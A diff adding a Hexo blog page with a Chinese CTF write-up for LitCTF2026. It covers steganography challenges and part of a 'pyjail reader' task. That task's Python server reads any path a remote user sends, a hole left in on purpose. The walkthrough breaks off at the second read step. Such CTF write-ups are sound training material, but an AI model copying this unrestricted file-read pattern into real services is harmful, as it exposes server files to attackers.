@@ -1,0 +1,1490 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="whyy">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2026/05/25/litctf2026wp全解/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LitCTF2026wp全解">
+<meta property="og:url" content="http://example.com/2026/05/25/LitCTF2026wp%E5%85%A8%E8%A7%A3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-05-25T04:55:52.000Z">
+<meta property="article:modified_time" content="2026-05-25T05:23:06.692Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/yzt724/picture/202503161349049.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/yzt724/picture/202503161349049.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/yzt724/picture/202503161349049.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            LitCTF2026wp全解 | Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+                
+                    <style>.home-article-meta .home-article-date { display: none !important; }</style>
+                
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?" rel="stylesheet">
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":false,"count":false,"min2read":false},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":true,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?"},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":"flase","site_uv":false,"post_pv":false},"single_page":true,"preloader":{"enable":"flase","custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[],"qrs":[]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":999,"tags_style":"could"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200},"footer":{"runtime":false,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">LitCTF2026wp全解</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505272034924.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">whyy</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-25 12:55:52</span>
+        <span class="mobile">2026-05-25 12:55:52</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-25 13:23:06</span>
+            <span class="mobile">2026-05-25 13:23:06</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="LitCTF2026-lit-lsb-base64"><a href="#LitCTF2026-lit-lsb-base64" class="headerlink" title="[LitCTF2026] lit_lsb_base64"></a>[LitCTF2026] lit_lsb_base64</h2><p>直接说了lsb隐写 用随波逐流看各通道隐写信息</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251309896.png"
+                      alt="img"
+                ></p>
+<p>对隐写数据base64解码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251310502.png"
+                      alt="img"
+                ></p>
+<h2 id="LitCTF2026-lit-rush-qr"><a href="#LitCTF2026-lit-rush-qr" class="headerlink" title="[LitCTF2026] lit_rush_qr"></a>[LitCTF2026] lit_rush_qr</h2><p>帧提取出残缺的二维码 可以看出二维码缺少定位符</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251310323.png"
+                      alt="img"
+                ></p>
+<p>使用在线工具补齐二维码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251310735.png"
+                      alt="img"
+                ></p>
+<h2 id="LitCTF2026-lit-sstv"><a href="#LitCTF2026-lit-sstv" class="headerlink" title="[LitCTF2026] lit_sstv"></a>[LitCTF2026] lit_sstv</h2><p>sstv在线解码工具 <a class="link"   target="_blank" rel="noopener" href="https://sstv-decoder.mathieurenaud.fr/" >https://sstv-decoder.mathieurenaud.fr/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251310513.png"
+                      alt="img"
+                ></p>
+<p>flag: LitCTF{sstv_p4t13nc3}</p>
+<h2 id="LitCTF2026-lit-welcome"><a href="#LitCTF2026-lit-welcome" class="headerlink" title="[LitCTF2026] lit_welcome"></a>[LitCTF2026] lit_welcome</h2><p>图片背景是纯白，用pixpix简单过一下发现像素全是（255，255，255）有的是(254，255，255)</p>
+<p>R 通道最低位 LSB 被改了，看0通道隐写数据。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251310395.png"
+                      alt="img"
+                ></p>
+<h2 id="LitCTF2026-lit-pyjail-reader"><a href="#LitCTF2026-lit-pyjail-reader" class="headerlink" title="[LitCTF2026] lit_pyjail_reader"></a>[LitCTF2026] lit_pyjail_reader</h2><p>题目附件</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;LitCTF — 入门 Pyjail：验证码 + 按指引两次只读文件（无 RCE）。&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line">MAX_QUEUED = <span class="number">64</span></span><br><span class="line">MAX_LINE = <span class="number">512</span></span><br><span class="line">MAX_FILE = <span class="number">4096</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_line</span>(<span class="params">conn: socket.socket</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    data = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(data) &lt; MAX_LINE:</span><br><span class="line">        chunk = conn.recv(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> chunk == <span class="string">b&quot;\n&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data += chunk</span><br><span class="line">    <span class="keyword">return</span> data.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>).strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_read</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    p = path.strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p <span class="keyword">or</span> p.startswith(<span class="string">&quot;-&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;\x00&quot;</span> <span class="keyword">in</span> p:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;invalid path&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(p, <span class="string">&quot;r&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read(MAX_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">conn: socket.socket</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn.settimeout(<span class="number">120</span>)</span><br><span class="line">        alphabet = string.ascii_uppercase</span><br><span class="line">        challenge = <span class="string">&quot;&quot;</span>.join(secrets.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>))</span><br><span class="line">        conn.sendall(</span><br><span class="line">            <span class="string">f&quot;Please enter the reverse of &#x27;<span class="subst">&#123;challenge&#125;</span>&#x27; to continue: &quot;</span>.encode()</span><br><span class="line">        )</span><br><span class="line">        ans = recv_line(conn)</span><br><span class="line">        <span class="keyword">if</span> ans != challenge[::-<span class="number">1</span>]:</span><br><span class="line">            conn.sendall(<span class="string">b&quot;Wrong reverse string. Bye.\n&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        conn.sendall(</span><br><span class="line">            <span class="string">b&quot;Good.\n&quot;</span></span><br><span class="line">            <span class="string">b&quot;Step 1: read /app/where_is_flag.txt (it contains the flag path).\n&quot;</span></span><br><span class="line">            <span class="string">b&quot;Step 2: read that path.\n&quot;</span></span><br><span class="line">            <span class="string">b&quot;File path (1/2): &quot;</span></span><br><span class="line">        )</span><br><span class="line">        p1 = recv_line(conn)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c1 = safe_read(p1)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            conn.sendall(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>\n&quot;</span>.encode(errors=<span class="string">&quot;replace&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        conn.sendall(<span class="string">b&quot;--- begin ---\n&quot;</span>)</span><br><span class="line">        conn.sendall(c1.encode(errors=<span class="string">&quot;replace&quot;</span>))</span><br><span class="line">        conn.sendall(<span class="string">b&quot;\n--- end ---\nFile path (2/2): &quot;</span>)</span><br><span class="line">        p2 = recv_line(conn)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c2 = safe_read(p2)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            conn.sendall(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>\n&quot;</span>.encode(errors=<span class="string">&quot;replace&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        conn.sendall(c2.encode(errors=<span class="string">&quot;replace&quot;</span>))</span><br><span class="line">        conn.sendall(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    srv.bind((HOST, PORT))</span><br><span class="line">    srv.listen(MAX_QUEUED)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client, _ = srv.accept()</span><br><span class="line">        threading.Thread(target=handle, args=(client,), daemon=<span class="literal">True</span>).start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<p>safe_read文件读取函数做了简单的安全防御</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">safe_read</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    p = path.strip()</span><br><span class="line">    <span class="comment"># 防御：路径不能为空、不能以 &quot;-&quot; 开头（防止某些命令注入误用）、不能包含空字符 \x00</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p <span class="keyword">or</span> p.startswith(<span class="string">&quot;-&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;\x00&quot;</span> <span class="keyword">in</span> p:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;invalid path&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(p, <span class="string">&quot;r&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read(MAX_FILE) <span class="comment"># 最多读取 4096 个字节，防止大文件撑爆内存</span></span><br></pre></td></tr></table></figure></div>
+
+<p> 当玩家连接成功后，整个交互流程在 <code>handle</code> 函数中展开，分为以下三个阶段：  </p>
+<p>1.验证码反转字符串</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alphabet = string.ascii_uppercase</span><br><span class="line">challenge = <span class="string">&quot;&quot;</span>.join(secrets.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>))</span><br><span class="line">conn.sendall(<span class="string">f&quot;Please enter the reverse of &#x27;<span class="subst">&#123;challenge&#125;</span>&#x27; to continue: &quot;</span>.encode())</span><br><span class="line">ans = recv_line(conn)</span><br><span class="line"><span class="keyword">if</span> ans != challenge[::-<span class="number">1</span>]:</span><br><span class="line">    conn.sendall(<span class="string">b&quot;Wrong reverse string. Bye.\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure></div>
+
+<p>逻辑：程序随机生成一个 8 位的大写字母字符串（例如 <code>ABCDEFGH</code>）。</p>
+<p>要求：玩家必须在网络端输入这个字符串的反转结果（例如 <code>HGFEDCBA</code>）。如果答错，连接直接断开。</p>
+<ol start="2">
+<li>第一步文件读取（寻找 Flag 路径）</li>
+</ol>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">conn.sendall(</span><br><span class="line">    <span class="string">b&quot;Good.\n&quot;</span></span><br><span class="line">    <span class="string">b&quot;Step 1: read /app/where_is_flag.txt (it contains the flag path).\n&quot;</span></span><br><span class="line">    <span class="string">b&quot;Step 2: read that path.\n&quot;</span></span><br><span class="line">    <span class="string">b&quot;File path (1/2): &quot;</span></span><br><span class="line">)</span><br><span class="line">p1 = recv_line(conn)</span><br><span class="line">c1 = safe_read(p1)</span><br></pre></td></tr></table></figure></div>
+
+<p>逻辑：验证通过后，程序会提示输入第一个文件的路径。根据提示，应该输入 <code>/app/where_is_flag.txt</code>。</p>
+<p>结果：程序会读取这个文件的内容，并用 <code>--- begin ---</code> 和 <code>--- end ---</code> 包裹打印给你。这个文件里存储着真正的 Flag 文件的存放路径（比如可能是 <code>/etc/flag</code> 或者 <code>/app/secret/flag.txt</code>）。</p>
+<ol start="3">
+<li>第二步文件读取（获取 Flag）</li>
+</ol>
